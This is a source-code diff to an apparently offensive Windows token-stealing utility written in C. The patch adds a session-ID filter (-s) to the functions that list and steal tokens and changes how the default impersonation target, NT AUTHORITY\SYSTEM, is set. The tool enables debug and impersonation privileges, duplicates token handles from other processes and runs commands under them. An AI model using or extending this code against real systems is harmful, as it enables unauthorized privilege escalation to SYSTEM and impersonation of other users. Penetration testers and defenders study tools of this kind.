@@ -41,6 +41,7 @@ wchar_t* User_to_impersonate = NULL;
 static int num = 0;
 int TokenTypeNeeded = 0;
 BOOL ForceImpersonation = FALSE;
+DWORD SessionId = -1;
 wchar_t WinStationName[256];
 wchar_t** TokenUsers = NULL; // Global ar\ray to store TokenUsers
 int num_TokenUsers = 0; // Number of TokenUsers currently in the array
@@ -330,19 +331,30 @@ int ExecuteWithToken(wchar_t* command, ULONG pid)
 	
 	BOOL success = FALSE;
 	int deleg = 0;
+	DWORD psessid = -1;
 	SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
 	
 
 	
 	ZeroMemory(&si, sizeof(STARTUPINFO));
 	si.cb = sizeof(STARTUPINFO);
+	if (User_to_impersonate == NULL)
+		User_to_impersonate = (wchar_t*)L"NT AUTHORITY\\SYSTEM";
 	if (!(processHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, pid)))
 	{
 		//printf("[-] Could not open PID %d %d!)\n", pid, GetLastError());
 
 		return 0;
 	}
+	bool b = ProcessIdToSessionId(pid, &psessid);
+	if (SessionId != -1)
+	{
 
+		if (!b || psessid != SessionId)
+			return 0;
+
+
+	}
 
 	handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
 	while ((status = NtQuerySystemInformation(
@@ -548,14 +560,22 @@ int ListTokens(ULONG pid, BOOL extended_list)
 	wchar_t SamAccount[128];
 	wchar_t SamAccountPid[256];
 	SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
+	DWORD psessid=1;
 
 	if (!(processHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, pid)))
 	{
-		
-		
-
-		return 0;
+			return 0;
 	}
+	bool b = ProcessIdToSessionId(pid, &psessid);
+	if (SessionId != -1)
+	{
+		
+		if (!b || psessid != SessionId)
+			return 0;
+
+
+	}
+
 
 	handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
 	while ((status = NtQuerySystemInformation(
@@ -606,6 +626,11 @@ int ListTokens(ULONG pid, BOOL extended_list)
 
 		if (!wcsncmp(objectTypeInfo->Name.Buffer, L"Token", objectTypeInfo->Name.Length / 2))
 		{
+			if (User_to_impersonate != NULL)
+			{
+				if (!IsValidToken(dupHandle))
+					continue;
+			}
 			int tl = TokenLevel(dupHandle, &ImpersonationLevel);
 			
 			if (tl == -1)
@@ -632,9 +657,9 @@ int ListTokens(ULONG pid, BOOL extended_list)
 			{
 
 					if (tl == TOKEN_PRIMARY)
-						wsprintf((wchar_t*)SamAccountPid, L"%s:(P):%d", (wchar_t*)SamAccount, pid);
+						wsprintf((wchar_t*)SamAccountPid, L"%s:(P):%d:%d", (wchar_t*)SamAccount, pid,psessid);
 					else
-						wsprintf((wchar_t*)SamAccountPid, L"%s:%d:%d", (wchar_t*)SamAccount, ImpersonationLevel, pid);
+						wsprintf((wchar_t*)SamAccountPid, L"%s:%d:%d:%d", (wchar_t*)SamAccount, ImpersonationLevel, pid,psessid);
 					add_string(SamAccountPid);
 			}
 			else
@@ -1146,11 +1171,12 @@ void usage()
 	printf("[!] Usage:\n");
 	printf("\t -l: list all users token\n");
 	printf("\t -e: list all users token with extended info ->\n\t\t <user>:<token_level (2)=Impersonation, (3)=Delegation,(P)=Primary>:<pid>\n");
-	printf("\t -p <pid>: steal token from specfic process pid\n");
-	printf("\t -u <user>: steal token of user <user>, default NT AUTHORITY\\SYSTEM\n");
+	printf("\t -p <pid>: list/steal token from specfic process pid\n");
+	printf("\t -u <user>: list/steal token of user <user>, default NT AUTHORITY\\SYSTEM for comamnd execution\n");
 	printf("\t -c <command>: command to execute with token\n");
 	printf("\t -t: force use of Impersonation Privilege\n");
 	printf("\t -b <token level>: needed token type: 1=Primary,2=Impersonation,3=Delegation\n");
+	printf("\t -s <SessionId>: list/steal token from specific session\n");
 
 }
 int wmain(int argc, WCHAR* argv[])
@@ -1227,6 +1253,11 @@ int wmain(int argc, WCHAR* argv[])
 				list_mode = TRUE;
 
 				break;
+			case 's':
+				++cnt;
+				--argc;
+				SessionId= _wtoi(argv[cnt]);
+				break;
 			case 'h':
 				usage();
 				exit(0);
@@ -1257,8 +1288,6 @@ int wmain(int argc, WCHAR* argv[])
 	HasAssignPriv = EnablePriv(hToken, SE_ASSIGNPRIMARYTOKEN_NAME);
 	EnablePriv(hToken, SE_IMPERSONATE_NAME);
 	EnablePriv(hToken, SE_DEBUG_NAME);
-	if (User_to_impersonate == NULL)
-		User_to_impersonate = (wchar_t*)L"NT AUTHORITY\\SYSTEM";
 	
 	if (pid == 0)
 	{
@@ -1283,10 +1312,14 @@ int wmain(int argc, WCHAR* argv[])
 			{
 
 				if (list_mode)
-
+				{
+				
 					ListTokens(aProcesses[i], extended_list);
+				}
 				else
 				{
+
+			
 
 					b = ExecuteWithToken(command, aProcesses[i]);
 					
@@ -1323,7 +1356,9 @@ int wmain(int argc, WCHAR* argv[])
 			}
 		}
 		else
+		{
 			ExecuteWithToken(command, pid);
+		}
 
 	}
 	return 0;
